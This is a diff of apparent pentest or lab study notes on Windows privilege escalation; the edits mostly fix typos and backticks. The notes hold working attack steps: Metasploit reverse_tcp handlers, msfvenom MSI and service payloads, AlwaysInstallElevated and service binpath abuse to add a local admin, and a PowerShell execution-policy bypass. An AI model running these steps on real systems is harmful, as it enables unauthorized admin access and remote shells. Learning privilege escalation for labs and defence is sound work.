@@ -48,11 +48,11 @@
 * winPEAS.exe (compile)
 * seatbelt.exe (compile)
 * Watson.exe (compile)
-* Sharup.exe (compile)
+* Sharpup.exe (compile)
 
 #### Powershell
 * Sherlock.ps1
-* PowerUps.ps1
+* PowerUp.ps1
 * jaws-enum.ps1
 
 #### Other:
@@ -72,7 +72,7 @@
 ##### Metasploit and winPEAS
 * on target machine from metasploit meterpreter shell:
 * `cd /tmp`
-* `upload /file_location_directory_on_attacker_machine/winPEAS.exe
+* `upload /file_location_directory_on_attacker_machine/winPEAS.exe`
 * `shell`
 * `./winPEAS.exe`
 
@@ -86,7 +86,7 @@
 ### Escalation path: password and port forwarding
 
 * **winexe** is a script allowing us to use Linux commands on windows, use it from shell
-* `winexe -U Administrator%<password> //127.0.0.1 "cmd.exe"
+* `winexe -U Administrator%<password> //127.0.0.1 "cmd.exe"`
 
 * on kali machine `apt install ssh`
 * quick mod on ssh itself: `nano /etc/ssh/sshd_config` **#PermitRootLogin** uncomment it and change it's permission to **yes**
@@ -147,7 +147,7 @@
 #### Using PowerUp
 
 * `Write-suserAddMSI` it's going to set up a file wich we can use to add admin user to the existing ones.
-* `net localground administrators`
+* `net localgroup administrators`
 
 #### there are packages for Windows, called MSI packages are Windows installers. We have the registry feature where they install packages elevated. They will install as an admin user. This is a configuration issue we can take advantage of this. If the value is set to 1 in the registry we can attack it!
 
@@ -159,8 +159,11 @@
 
 ##### Exploit:
 
-* start metasploit, then `use multi/handler` and `set payload windows/meterpreter/reverse_tcp` and `set lhost <your IP` finally: `run`
-* generate payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f msi -o setup.msi
+* start metasploit, then `use multi/handler`
+* `set payload windows/meterpreter/reverse_tcp`
+* `set lhost <your IP`
+* `run`
+* generate payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp lhost=<your IP> -f msi -o setup.msi`
 * place generated setup.msi from kali onto the target machine's /temp folder
 * run it and enjoy your shell :)
 
@@ -250,7 +253,7 @@
 * `sc config daclsvc binpath= "net localgroup administrators user /add"`
 * it will say ***success!***
 * nothing will show up as of now but if we start the service: `sc start daclsvc` then `net localgroup administrators`
-* there will be a creater "user" withing the administrators group
+* there will be the created "user" withing the administrators group
 
 ### Escalation via Unquoted Service Path
 ### (Because it's not quoted off we can modify it and get malicious with it!)
@@ -268,7 +271,7 @@
 
 #### Exploitation:
 
-* `powershell -ep bypass
+* `powershell -ep bypass`
 * `. .\PowerUps.ps1`
 * `Invoke-AllChecks`
 * in msfvenom on kali: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
